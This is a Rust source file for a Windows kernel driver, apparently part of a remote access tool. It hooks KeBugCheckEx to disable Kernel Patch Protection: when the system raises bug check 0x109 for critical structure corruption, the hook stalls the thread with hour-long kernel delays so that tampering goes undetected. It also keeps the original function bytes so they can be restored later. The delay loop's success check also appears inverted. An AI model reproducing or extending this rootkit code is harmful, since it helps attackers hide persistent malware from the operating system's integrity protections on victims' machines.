use alloc::boxed::Box;
use alloc::vec::Vec;
use core::ffi::c_void;
use core::sync::atomic::{AtomicPtr, Ordering};
use core::{ptr, slice};

use rat_common::windows::kernel::KernelHandoff;
use wdk::nt_success;
use wdk_sys::_MODE::KernelMode;
use wdk_sys::ntddk::{
    KeBugCheckEx, KeDelayExecutionThread, KeGetCurrentIrql, MmGetSystemRoutineAddress,
    RtlInitUnicodeString,
};
use wdk_sys::{DISPATCH_LEVEL, LARGE_INTEGER, ULONG, ULONG_PTR, UNICODE_STRING};
use widestring::u16cstr;

use crate::wrappers::bindings::debug_break;
use crate::wrappers::mdl::MdlGuard;
use crate::{error, info};

const _CRITICAL_STRUCTURE_CORRUPTION: ULONG = 0x109;

static _KE_BUG_CHECK_EX_RECOVERY: AtomicPtr<Vec<u8>> = AtomicPtr::new(ptr::null_mut());

#[unsafe(no_mangle)]
unsafe extern "C" fn ke_bug_check_ex_hook(
    code: ULONG,
    parameter_1: ULONG_PTR,
    parameter_2: ULONG_PTR,
    parameter_3: ULONG_PTR,
    parameter_4: ULONG_PTR,
) -> ! {
    info!(
        "KeBugCheckEx called with 0x{code:X}, parameters: 0x{parameter_1:X}, 0x{parameter_2:X}, 0x{parameter_3:X}, 0x{parameter_4:X}",
    );
    if code == _CRITICAL_STRUCTURE_CORRUPTION {
        let irql = unsafe { KeGetCurrentIrql() };
        if u32::from(irql) < DISPATCH_LEVEL {
            let mut interval = LARGE_INTEGER {
                QuadPart: -36000000000, // 1 hour
            };
            loop {
                let status = unsafe { KeDelayExecutionThread(KernelMode as i8, 0, &mut interval) };
                if nt_success(status) {
                    error!("KeDelayExecutionThread error: 0x{status:X}");
                    break;
                }
            }
        }
    }

    let recovery = _KE_BUG_CHECK_EX_RECOVERY.load(Ordering::Acquire);
    match unsafe { recovery.as_ref() } {
        Some(recovery) => {
            let ke_bug_check_ex = unsafe {
                let mut name = UNICODE_STRING::default();
                RtlInitUnicodeString(&mut name, u16cstr!("KeBugCheckEx").as_ptr());
                MmGetSystemRoutineAddress(&mut name)
            };

            if ke_bug_check_ex.is_null() {
                error!("Cannot get address of KeBugCheckEx for recovery");
                debug_break();
            }

            match unsafe { MdlGuard::new(ke_bug_check_ex, recovery.len() as u32) } {
                Ok(mut mdl) => {
                    mdl.as_mut_slice().copy_from_slice(recovery);

                    info!("Recovered KeBugCheckEx with {recovery:02X?}");
                    unsafe {
                        KeBugCheckEx(code, parameter_1, parameter_2, parameter_3, parameter_4);
                    }
                }
                Err(e) => {
                    error!("Failed to construct MDL to recover KeBugCheckEx: {e}");
                }
            }
        }
        None => {
            error!("No information to recover KeBugCheckEx");
        }
    }

    debug_break();
}

pub unsafe extern "C" fn disable_kpp_thread_routine(extra: *mut c_void) {
    let extra = unsafe { Box::from_raw(extra.cast::<KernelHandoff>()) };
    let recovery = unsafe {
        slice::from_raw_parts(
            extra.ke_bug_check_ex.instructions,
            extra.ke_bug_check_ex.instructions_len,
        )
    };
    _KE_BUG_CHECK_EX_RECOVERY.store(
        Box::into_raw(Box::new(recovery.to_vec())),
        Ordering::Release,
    );
}
